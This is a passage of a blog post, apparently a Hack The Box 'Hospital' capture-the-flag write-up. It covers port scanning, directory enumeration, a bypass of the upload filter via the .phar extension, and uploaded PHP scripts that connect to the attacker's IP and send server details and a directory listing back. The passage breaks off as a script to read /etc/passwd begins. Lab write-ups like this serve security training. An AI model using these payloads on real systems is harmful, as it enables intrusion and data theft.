@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
+<title>HTB Hospital Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB Hospital Write-up" />
+<meta name="description" content="A write-up for the Hospital box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://jordangalida.github.io/htb-hospital-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB Hospital Write-up">
+  <meta property="og:description" content="A write-up for the Hospital box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-03-17T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-17T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
+  <meta name="twitter:title" content="HTB Hospital Write-up">
+  <meta name="twitter:description" content="A write-up for the Hospital box.">
+
+
+
+
+  <meta itemprop="name" content="HTB Hospital Write-up">
+  <meta itemprop="description" content="A write-up for the Hospital box.">
+  <meta itemprop="datePublished" content="2025-03-17T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-03-17T00:00:00+00:00">
+  <meta itemprop="wordCount" content="4358">
+  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+      --overflow-wrap: break-word;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB Hospital Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-03-17'>
+      17 Mar, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>Starting off with my usual <code>nmap</code> scans</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sV -sC -p- 10.10.11.241 Scans/hospital_all
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 12:22 EDT
+</span></span><span style="display:flex;"><span>Unable to split netmask from target expression: &#34;Scans/hospital_all&#34;
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.241
+</span></span><span style="display:flex;"><span>Host is up (0.020s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65506 filtered tcp ports (no-response)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE           VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+</span></span><span style="display:flex;"><span>53/tcp   open  domain            Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-03-17 23:25:18Z)
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=DC
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+</span></span><span style="display:flex;"><span>|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=localhost
+</span></span><span style="display:flex;"><span>| Not valid before: 2009-11-10T23:48:47
+</span></span><span style="display:flex;"><span>|_Not valid after:  2019-11-08T23:48:47
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl?
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=DC
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>1801/tcp open  msmq?
+</span></span><span style="display:flex;"><span>2103/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>2105/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>2107/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>2179/tcp open  vmrdp?
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=DC
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl?
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=DC
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   Target_Name: HOSPITAL
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: HOSPITAL
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: DC
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: hospital.htb
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: DC.hospital.htb
+</span></span><span style="display:flex;"><span>|   DNS_Tree_Name: hospital.htb
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_  System_Time: 2025-03-17T23:26:13+00:00
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2025-03-16T22:19:56
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-09-15T22:19:56
+</span></span><span style="display:flex;"><span>5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>6404/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>6407/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6409/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6613/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6633/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6656/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.55 (Ubuntu)
+</span></span><span style="display:flex;"><span>| http-title: Login
+</span></span><span style="display:flex;"><span>|_Requested resource was login.php
+</span></span><span style="display:flex;"><span>9389/tcp open  mc-nmf            .NET Message Framing
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-03-17T23:26:17
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 253.41 seconds
+</span></span></code></pre></div><p>Attempting a zone transfer fails and digging around DNS doesn&rsquo;t find anything. Attempting to access SMB also fails, and the <code>guest</code> user is disabled. Let&rsquo;s go the website
+<img src="/images/Hospital/website.png" alt="Website"></p>
+<p>Looks like it takes us straight to a login portal. Trying a few weak credential pairs, and SQL injection fails. Let&rsquo;s setup some recon in the background to look for more directories. There is also another site on 443, so we go there, which says it&rsquo;s &ldquo;Hospital Webmail&rdquo;
+<img src="/images/Hospital/443.png" alt="Website HTTPS"></p>
+<p>Out <code>gobuster</code> scan finishes and we find a few interesting directories</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://10.10.11.241:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.0.1
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:            http://10.10.11.241:8080/
+</span></span><span style="display:flex;"><span>[+] Threads:        300
+</span></span><span style="display:flex;"><span>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span style="display:flex;"><span>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span style="display:flex;"><span>[+] User Agent:     gobuster/3.0.1
+</span></span><span style="display:flex;"><span>[+] Timeout:        10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>2025/03/17 12:37:07 Starting gobuster
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/images (Status: 301)
+</span></span><span style="display:flex;"><span>/css (Status: 301)
+</span></span><span style="display:flex;"><span>/js (Status: 301)
+</span></span><span style="display:flex;"><span>/vendor (Status: 301)
+</span></span><span style="display:flex;"><span>/fonts (Status: 301)
+</span></span><span style="display:flex;"><span>/uploads (Status: 301)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>2025/03/17 12:37:31 Finished
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span></code></pre></div><p>The <code>uploads</code> and <code>vendor</code> directories look interesting, but they result in a 403. We try some verb tampering, but nothing. Trying a quick brute-force for the admin user doesn&rsquo;t get us anything either. On the port 8080 site, there is a function to register a user
+<img src="/images/Hospital/signup.png" alt="Register"></p>
+<p>Logging in takes us to a page where we can upload files!
+<img src="/images/Hospital/upload.png" alt="Upload"></p>
+<p>Let&rsquo;s try to upload a basic PHP file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat &gt; hello.php
+</span></span><span style="display:flex;"><span>&lt;?php echo “Hello World”;?&gt;
+</span></span></code></pre></div><p>But uploading it redirects us to a <code>failed.php</code>. When I went to upload the file, the default filetype was set to images, so let&rsquo;s try to upload a normal image file and see if we can access it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /upload.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.241:8080</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=----geckoformboundaryf76689993fc284b3774afc9a62b2dd3</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">610533</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.241:8080</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.241:8080/index.php</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=ai6qsgr26pe0lnbum0fnhq77is</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------geckoformboundaryf76689993fc284b3774afc9a62b2dd3
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;cat.jpg&#34;
+</span></span><span style="display:flex;"><span>Content-Type: image/jpeg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ÿØÿà
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>We upload a <code>jpg</code> images called <code>cat.jpg</code>. It was successful, now let&rsquo;s try to navigate to the image, and we can!
+<img src="/images/Hospital/cat.png" alt="Cat"></p>
+<p>Let&rsquo;s try to bypass the upload restrictions to upload our PHP file. Trying to upload <code>hello.jpg.php</code> fails. If we use Burp to fuzz various PHP extensions, we notice that the website isn&rsquo;t blocking on some of them, for example <code>pgif</code>. We upload our shell that way and navigate to the file, but it&rsquo;s not executing
+<img src="/images/Hospital/notworking.png" alt="No Execution"></p>
+<p>If we fuzz all PHP extensions, we see which ones get through
+<img src="/images/Hospital/ext.png" alt="File Extensions"></p>
+<p>Now if we fuzz trying to access those files, we notice that only one isn&rsquo;t showing my PHP code on the page, and that&rsquo;s <code>phar</code>. But it isn&rsquo;t executing any commands when I append a <code>?cmd=id</code>. Let&rsquo;s see if we can get some PHP to execute at all. We try to upload a basic PHP script that just prints &ldquo;Hello World&rdquo; to the page again, but no luck. I wonder if it is executing but just not displaying any thing? Let&rsquo;s create a simple PHP script to call back to us</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.14.51&#39;</span>; 
+</span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($sock) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($sock, <span style="color:#e6db74">&#34;Hello from PHP!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($sock);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Failed to connect to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>We upload it as <code>call.phar</code> and set up our <code>nc</code> listener</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">8888</span>
+</span></span><span style="display:flex;"><span>listening on [any] 8888 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.241] 6522
+</span></span><span style="display:flex;"><span>Hello from PHP!
+</span></span></code></pre></div><p>And we get a call back! So it is executing! However, trying to run system commands doesn&rsquo;t work. But we can send information back to ourselves</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.14.51&#39;</span>;
+</span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
+</span></span><span style="display:flex;"><span>$sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($sock) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;PHP INFO:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;PHP Version: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">phpversion</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Server Software: &#34;</span> <span style="color:#f92672">.</span> $_SERVER[<span style="color:#e6db74">&#39;SERVER_SOFTWARE&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Server Name: &#34;</span> <span style="color:#f92672">.</span> $_SERVER[<span style="color:#e6db74">&#39;SERVER_NAME&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Document Root: &#34;</span> <span style="color:#f92672">.</span> $_SERVER[<span style="color:#e6db74">&#39;DOCUMENT_ROOT&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Current User: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">get_current_user</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;OS: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#66d9ef">PHP_OS</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;DIRECTORY LISTING:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($dir <span style="color:#66d9ef">as</span> $item) {
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">.=</span> $item <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($sock, $output);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($sock);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Failed to connect to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>We save this as <code>tshoot.phar</code>, start our listener, and upload it and we get info back</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">8888</span>
+</span></span><span style="display:flex;"><span>listening on [any] 8888 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.241] 6544
+</span></span><span style="display:flex;"><span>PHP INFO:
+</span></span><span style="display:flex;"><span>PHP Version: 7.4.33
+</span></span><span style="display:flex;"><span>Server Software: Apache/2.4.55 (Ubuntu)
+</span></span><span style="display:flex;"><span>Server Name: 10.10.11.241
+</span></span><span style="display:flex;"><span>Document Root: /var/www/html
+</span></span><span style="display:flex;"><span>Current User: www-data
+</span></span><span style="display:flex;"><span>OS: Linux
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>DIRECTORY LISTING:
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>..
+</span></span><span style="display:flex;"><span>tshoot.phar
+</span></span></code></pre></div><p>So looks like scripts aren&rsquo;t allowed to run system level commands. We are probably going to have to just read files. Let&rsquo;s try to read <code>/etc/passwd</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.14.51&#39;</span>;
+</span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
+</span></span><span style="display:flex;"><span>$sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($sock) {
